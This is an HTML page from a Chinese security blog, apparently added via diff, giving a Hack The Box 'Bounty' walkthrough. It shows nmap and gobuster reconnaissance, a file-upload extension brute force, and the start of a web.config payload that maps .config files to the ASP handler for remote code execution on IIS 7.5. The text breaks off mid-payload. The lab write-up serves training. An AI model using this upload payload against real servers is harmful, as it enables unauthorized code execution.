@@ -1,0 +1,1203 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="the notes record by hypnotic">
+      
+      
+        <meta name="author" content="hypnotic">
+      
+      
+        <link rel="canonical" href="https://hypnoticp.github.io/CTF/HTB/Windows-Bounty/index.html">
+      
+      
+      
+      
+      <link rel="icon" href="../../../icons/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>信息收集 - hypnotic的博客</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CUbuntu+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Ubuntu Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-header__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            hypnotic的博客
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              信息收集
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../index.html" class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Code_audit/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Code_audit
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Vulnerability_analysis/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Vulnerability_analysis
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Tools/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../index.html" class="md-tabs__link">
+          
+  
+    
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../SRC/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  SRC
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Security_devices/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Security_devices
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Shell_Scripts/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Shell_Scripts
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about.html" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-nav__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    hypnotic的博客
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Code_audit/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Code_audit
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Vulnerability_analysis/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Vulnerability_analysis
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Tools/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../SRC/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    SRC
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Security_devices/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Security_devices
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Shell_Scripts/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Shell_Scripts
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="_1">信息收集<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="namp">Namp<a class="headerlink" href="#namp" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.93 -oA scans/ports
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>...
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>PORT   STATE SERVICE
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>80/tcp open  http
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>...
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>root@kali# nmap -sT -sC -sV -O -p80 10.10.10.93 -oA scans/details
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>...
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>PORT   STATE SERVICE VERSION
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>80/tcp open  http    Microsoft IIS httpd 7.5
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>| http-methods:
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>|_  Potentially risky methods: TRACE
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>|_http-server-header: Microsoft-IIS/7.5
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>|_http-title: Bounty
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>..
+</code></pre></div>
+<h2 id="fuzz">目录FUZZ<a class="headerlink" href="#fuzz" title="Permanent link">&para;</a></h2>
+<p><strong>根据Microsoft IIS httpd 7.5知道这是windows server 2008 R2系统，一般都存在aspx动态网页文件…发现了tranfer.aspx</strong></p>
+<p><img alt="截图" src="0486484df392186d19690f1e6375d7a2.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>root@kali# gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx                    
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>...
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>/transfer.aspx        (Status: 200)
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>/aspnet_client        (Status: 301) [Size: 156] [--&gt; http://10.10.10.93/aspnet_client/]
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>/uploadedfiles        (Status: 301) [Size: 156] [--&gt; http://10.10.10.93/uploadedfiles/]
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>...
+</code></pre></div>
+<h2 id="web">WEB服务<a class="headerlink" href="#web" title="Permanent link">&para;</a></h2>
+<p><img alt="截图" src="c56a85709ee06e7f73e31dbf45c13f31.png" /></p>
+<p>查看前端源码没发现什么…</p>
+<h3 id="tranferaspx">tranfer.aspx：<a class="headerlink" href="#tranferaspx" title="Permanent link">&para;</a></h3>
+<p><img alt="截图" src="fe027e7d766909e497ad6d4f00452d95.png" /></p>
+<p><code>transfer.aspx</code>是一个文件上传页面,所有成功上传的文件都会到<code>uploadedfiles</code>下，不过这个目录下的文件过一段时间（几十秒）就会被删除.</p>
+<p><img alt="截图" src="915dcb745b82397491ceb61b99dc716a.png" /></p>
+<p>使用BP，截断上传页面信息，<strong>使用intruder，爆破扩展名，发现允许上传的扩展名包括:gif,jpg,png,config。</strong></p>
+<p>在谷歌上搜索<strong>IIS httpd 7.5 upload rce</strong>，可以看看这两篇文章：</p>
+<p><a href="https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/">Upload a web.config File for Fun &amp; Profit</a></p>
+<p><a href="https://003random.com/posts/archived/2018/05/22/rce-by-uploading-a-web-config/">通过上传 web.config 进行 RCE</a></p>
+<p>如何简单理解呢？上传 .htaccess 文件以绕过上传文件的保护是一种已知技术，在这里上传web.config的作用和.htaccess类似。有时 IIS 支持 ASP 文件，但无法上传任何扩展名为 .ASP 的文件。在这种情况下，可以直接使用web.config文件来运行ASP经典代码。</p>
+<blockquote>
+<p>什么是 web.config 文件？</p>
+<p>web.config 文件是用于配置 ASP.NET 网站或 Web 应用程序的 XML 格式配置文件。它通常位于网站的根目录中，并包含了许多配置设置，例如数据库连接字符串、会话状态配置、身份验证设置、授权规则、错误处理方式以及其他与网站功能相关的设置。通过编辑 web.config 文件，开发人员可以对网站的行为进行广泛的调整和定制，而无需修改源代码。</p>
+</blockquote>
+<h1 id="_2">漏洞利用<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<p>上传一个web.config文件，在注释里执行asp代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>&lt;configuration&gt;
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>   &lt;system.webServer&gt;
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>      &lt;/handlers&gt;
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>      &lt;security&gt;
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>         &lt;requestFiltering&gt;
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>            &lt;fileExtensions&gt;
